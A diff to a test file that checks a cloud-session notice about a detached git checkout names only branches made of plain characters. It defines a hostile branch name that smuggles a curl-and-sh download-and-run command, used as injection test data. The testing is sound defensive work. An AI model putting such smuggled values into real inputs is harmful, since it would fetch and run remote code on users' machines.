@@ -12,6 +12,10 @@ afterEach(cleanup)
 const CLOUD = { CLAUDE_CODE_REMOTE: "true" }
 const NOTICE = "primary checkout of this cloud session is on a detached HEAD"
 const MOVED = "primary checkout of this cloud session moved off the branch it started on"
+// Shell metacharacters (; $ { } & backtick #) fail the notice's allowlist, yet all are valid in a
+// file name on Windows, macOS and Linux, since git stores the ref as a file. `|` is not valid on
+// NTFS, so it stays out: git cannot create the ref there.
+const HOSTILE = "x;curl${IFS}host/p&sh`#"
 
 /**
  * A repository whose primary checkout starts on the assigned branch, cut from a commit on `main` as
@@ -105,7 +109,7 @@ describe("the notice of a detached primary checkout in a cloud session", () => {
   })
 
   test("is not shown when the start branch is refused and the checkout is on the branch it would name", async () => {
-    const dir = await session("x;curl${IFS}host/p|sh`#")
+    const dir = await session(HOSTILE)
     await sh(dir, ["git", "switch", "-q", "main"])
     expect(await status(dir, CLOUD)).not.toHaveProperty("notice")
     expect(await started(dir, CLOUD)).not.toContain(MOVED)
@@ -126,8 +130,7 @@ describe("the notice of a detached primary checkout in a cloud session", () => {
   })
 
   test("names only a branch of plain characters, else the default branch", async () => {
-    const hostile = "x;curl${IFS}host/p|sh`#"
-    const dir = await session(hostile)
+    const dir = await session(HOSTILE)
     await detach(dir)
     const shown = String((await status(dir, CLOUD)).notice)
     expect(shown).toContain(NOTICE)
@@ -142,7 +145,7 @@ describe("the notice of a detached primary checkout in a cloud session", () => {
       "git",
       "symbolic-ref",
       "refs/remotes/origin/HEAD",
-      `refs/remotes/origin/${hostile}`,
+      `refs/remotes/origin/${HOSTILE}`,
     ])
     const fallback = String((await status(remote, CLOUD)).notice)
     expect(fallback).toContain("`git switch main`")
